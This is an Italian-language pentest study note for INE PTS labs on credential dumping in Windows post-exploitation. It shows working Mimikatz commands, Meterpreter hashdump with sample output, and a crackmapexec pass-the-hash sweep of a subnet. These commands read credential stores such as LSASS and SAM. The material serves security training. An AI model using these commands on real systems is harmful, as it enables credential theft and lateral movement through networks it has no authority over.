# Credential Dumping con Mimikatz

**Difficoltà:** Advanced
**Time to Master:** 2h
**Prerequisiti:** [01-Windows-Host-Attacks.md](01-Windows-Host-Attacks.md)
**Lab:** INE PTS labs (rete Windows con accesso amministrativo già ottenuto)

---

## Obiettivo

Hai già una sessione SYSTEM su un host Windows: a questo punto la domanda giusta non è più "come entro", ma "chi altro posso raggiungere da qui". La risposta passa quasi sempre dalle credenziali che quell'host ha in memoria o nel proprio database locale. Qui vedi da dove si estraggono (SAM locale, memoria LSASS) e come si riutilizzano per muoversi lateralmente — il ponte concettuale verso tutta la post-exploitation che segue.

---

## Concetti chiave

### Dove vivono le credenziali su Windows

| Fonte | Cosa contiene | Richiede |
|-------|-----------------|----------|
| SAM (Security Account Manager) | hash NTLM degli utenti locali | accesso amministrativo locale |
| LSASS (memoria di processo) | credenziali in chiaro/hash di sessioni attive (incl. utenti di dominio) | privilegi SYSTEM/debug |
| NTDS.dit | database utenti dell'intero dominio Active Directory | accesso al Domain Controller |

**Importante, e facile da confondere quando si è agli inizi:** il credential dumping richiede SEMPRE privilegi elevati già ottenuti (admin locale o SYSTEM). Non è una tecnica di accesso iniziale, è post-exploitation pura — per questo va studiata dopo aver capito come ottenere una prima shell (vedi [01-Windows-Host-Attacks.md](01-Windows-Host-Attacks.md)), non prima.

### Pass-the-Hash (PtH): concetto

Il dettaglio che cambia tutto: Windows autentica spesso usando l'hash NTLM stesso, non la password in chiaro. Questo significa che se ottieni l'hash di un utente, puoi usarlo direttamente per autenticarti su altri sistemi della rete senza mai conoscere (né craccare) la password reale. Non è un dettaglio tecnico marginale — è una delle tecniche di lateral movement più comuni in ambienti Windows/AD, e la vedrai spuntare ovunque una volta che impari a riconoscerla.

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| mimikatz | `privilege::debug` poi `sekurlsa::logonpasswords` | credenziali in memoria | richiede SYSTEM o debug privilege |
| mimikatz (SAM) | `lsadump::sam` | hash NTLM utenti locali | richiede accesso al registro SAM |
| Meterpreter | `hashdump` (post ottenuto SYSTEM) | hash NTLM utenti locali | integrato in Metasploit, non richiede mimikatz separato |
| crackmapexec/netexec | `nxc smb target -u user -H <NTLM-hash>` | verifica pass-the-hash | testa l'hash su tutta la rete |

---

## Payload / Esempi

### Esempio 1: dump SAM da meterpreter (dopo aver ottenuto SYSTEM)

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > hashdump
```

**Output atteso:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

**Spiegazione:** con privilegi SYSTEM, `hashdump` legge direttamente il database SAM e restituisce username:RID:hash-LM:hash-NTLM. Il primo hash (LM) su sistemi moderni e sempre il valore vuoto standard; il secondo (NTLM) e quello utile per cracking o pass-the-hash.

### Esempio 2: mimikatz da shell diretta sull'host

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

**Output atteso:**
```
Authentication Id : 0 ; 123456
User Name         : jsmith
Domain            : CORP
NTLM              : a1b2c3d4e5f6...
```

**Spiegazione:** `sekurlsa::logonpasswords` legge la memoria del processo LSASS e mostra le credenziali (talvolta anche in chiaro, se l'host non ha WDigest disabilitato) di ogni sessione attiva sull'host, incluse quelle di utenti di dominio che si sono autenticati localmente.

### Esempio 3: riutilizzo dell'hash con pass-the-hash

```bash
crackmapexec smb 10.10.10.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

**Spiegazione:** l'hash NTLM ottenuto viene testato direttamente su tutta la subnet senza mai craccarlo; se l'hash e riutilizzato su altri host (comune quando l'admin locale ha la stessa password ovunque), si ottiene accesso immediato senza bisogno di password in chiaro.

---

## Lab Hands-On

### Lab 1: INE PTS, Windows post-exploitation lab
**Obiettivo:** dopo aver ottenuto SYSTEM su un host Windows, estrarre e riutilizzare credenziali su altri host della rete
**Difficulty:** Intermedio
**Time:** 1h

**Walkthrough breve:**
1. Ottieni una sessione meterpreter con privilegi SYSTEM (vedi privilege escalation)
2. Esegui `hashdump` o mimikatz per estrarre gli hash
3. Testa gli hash trovati su altri host della rete con crackmapexec/netexec

---

## Common Mistakes

- Provare a dumpare credenziali senza aver prima verificato i privilegi (`getuid`/`whoami`) -> fallisce silenziosamente o con errore di accesso negato
- Craccare l'hash NTLM quando basterebbe il pass-the-hash diretto -> perdita di tempo inutile
- Non testare gli hash trovati su TUTTA la rete raggiungibile -> si perde spesso l'opportunità di lateral movement più rapida del lab

---

## Link Utili

- [Mimikatz: GitHub](https://github.com/gentilkiwi/mimikatz)
- [Pass-the-Hash: MITRE ATT&CK T1550.002](https://attack.mitre.org/techniques/T1550/002/)

---

## Connessioni

- **Prerequisito:** [01-Windows-Host-Attacks.md](01-Windows-Host-Attacks.md)
- **Prossimo Step:** [Lab-Challenges.md](Lab-Challenges.md)
- **Combinazione con:** [../08-Exploitation-PostEx/03-Privilege-Escalation-Windows.md](../08-Exploitation-PostEx/03-Privilege-Escalation-Windows.md)

---

## Checklist di padronanza

- [ ] Capisco perché il credential dumping richiede privilegi già elevati
- [ ] So estrarre hash SAM con meterpreter o mimikatz
- [ ] So spiegare il concetto di pass-the-hash
- [ ] So testare un hash trovato su più host della rete

